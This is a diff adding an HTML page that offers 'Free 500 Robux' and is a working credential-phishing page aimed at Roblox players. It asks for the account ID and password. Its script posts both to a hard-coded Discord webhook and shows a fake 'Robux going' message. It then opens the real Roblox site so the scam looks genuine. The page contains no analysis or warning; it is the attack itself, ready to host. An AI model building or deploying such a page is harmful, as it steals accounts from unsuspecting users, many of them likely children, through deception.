@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 500 Robux</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('https://devforum.roblox.com/uploads/short-url/pWUtWXByBdk1PqiEEhH18mP8kmA.jpeg');
+            background-size: cover; /* 배경 이미지를 화면에 꽉 채우도록 설정 */
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+        }
+        .container {
+            width: 150%; /* Set container width to 100% */
+            max-width: 350px; /* Set maximum width to 450px */
+            margin: 150px auto; /* 상단 여백을 줄입니다. */
+            padding: 5px;
+            border-radius: 5px;
+            background-color: rgba(35, 37, 39, 0.75); /* 투명도 조절 가능한 rgba 사용 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            font-family: 'gotham-font', sans-serif; /* gotham-font로 변경 */
+            font-weight: bold; /* 굵게 설정 */
+        }
+        h2 {
+            margin-top: 0;
+            color: white; /* 헤더 텍스트 색상을 흰색으로 설정 */
+            font-weight: 520;
+            font-family: 'gotham-font', sans-serif; /* gotham-font로 변경 */
+        }
+        .input-group {
+            margin-bottom: 15px;
+            background-color: #000; /* 공간의 배경색 회색으로 변경 */
+            padding: 5px; /* 입력 공간에 간격 추가 */
+            border-radius: 5px; /* 입력 공간에도 라운드 적용 */
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 3px;
+            color: #fff; /* 텍스트 색상 흰색으로 설정 */
+            font-weight: 500;
+        }
+        .input-group input {
+            width: calc(100% - 23px);
+            height: 15px;
+            padding: 10px;
+            border: 1px solid #ffffff;
+            border-radius: 5px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+            background-color: transparent; /* 입력 필드 배경색 투명으로 설정 */
+            color: white; /* 입력할 때 텍스트 색상 흰색으로 설정 */
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        button {
+            width: 100%;
+            padding: 12px 0;
+            background-color: #fff;
+            color: black;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.6s;
+            font-family: 'gotham-font', sans-serif; /* gotham-font로 변경 */
+            font-weight: bold; /* 굵게 설정 */
+        }
+        button:hover {
+            background-color: #212121;
+        }
+        #result {
+            display: none; /* 결과를 초기에는 숨깁니다. */
+            margin-top: 20px; /* 결과와 버튼 사이의 간격을 설정합니다. */
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>ROBUX GIVER</h2>
+        <div class="input-group">
+            <label for="name1">ID:</label>
+            <input type="text" id="name1">
+        </div>
+        <div class="input-group">
+            <label for="name2">Password:</label>
+            <input type="text" id="name2">
+        </div>
+        <button onclick="sendMessage()">Claim ROBUX</button>
+        <!-- 결과를 표시할 div -->
+        <div id="result"></div>
+    </div>
+
+    <script>
+    function sendMessage() {
+        var name1 = document.getElementById("name1").value;
+        var name2 = document.getElementById("name2").value;
+        var inputText = name1 + ", " + name2;
+        // 여기서 디스코드 웹훅 URL을 수정하세요.
+        var discordWebhookURL = "https://discord.com/api/webhooks/1221117676206952449/SYa8cjd6H0T9s5m9yU-hDczHc5g5MQITv29m3w2vwhDNZhPEFMvpCZTHtGhFCYG-9uyF";
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", discordWebhookURL);
+        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+        // 결과 값을 생성합니다.
+        var result = ">";
+
+        var payload = {
+            content: inputText + " 500 Robux going..." // 결과 값을 메시지에 포함시킵니다.
+        };
+
+        xhr.send(JSON.stringify(payload));
+
+        // 결과를 표시할 div에 결과를 추가합니다.
+        var resultDiv = document.getElementById("result");
+        resultDiv.style.display = "block"; // 결과를 표시합니다.
+        resultDiv.innerHTML = "500 Robux going...(write proper id,pw)"; // "계산중..."으로 설정합니다.
+
+        // 1초 후에 결과를 설정합니다.
+        setTimeout(function() {
+            resultDiv.innerHTML = "Robux: " + result + "(it will take 10~30 minutes)" ;
+            // Redirect to Roblox in a new window after displaying the final message
+            setTimeout(function() {
+                window.open("https://www.roblox.com/home", "_blank");
+            }, 1000);
+        }, 1000);
+    }
+</script>
+</body>
+</html>
